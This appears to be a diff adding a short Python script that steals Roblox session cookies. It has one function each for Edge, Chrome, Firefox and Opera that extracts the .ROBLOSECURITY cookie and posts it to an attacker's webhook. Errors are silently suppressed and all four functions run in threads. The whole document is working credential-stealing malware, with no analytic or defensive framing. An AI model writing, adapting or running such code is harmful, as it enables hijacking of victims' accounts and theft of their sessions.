@@ -1,0 +1,42 @@
+webhook = "YOURWEBHOOK"
+
+def edge_logger():
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'serlakilled', 'content':f'ms edge```{cookie}```'})
+    except:
+        pass
+        
+def chrome_logger():
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'serlakilled','avatar':'https://cdn.discordapp.com/attachments/823175253659222026/1006338286253522954/unknown.png', 'content': f'chrome ```{cookie}```'})
+    except:
+        pass
+
+def firefox_logger():
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'serlakilled','avatar':'https://cdn.discordapp.com/attachments/823175253659222026/1006338286253522954/unknown.png', 'content': f'firefox ```{cookie}```'})
+    except:
+        pass
+
+def opera_logger():
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'serlakilled','avatar':'https://cdn.discordapp.com/attachments/823175253659222026/1006338286253522954/unknown.png','content': f'opera ```{cookie}```'})
+    except:
+        pass
+
+browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]
+
+for x in browsers:
+    threading.Thread(target=x,).start()
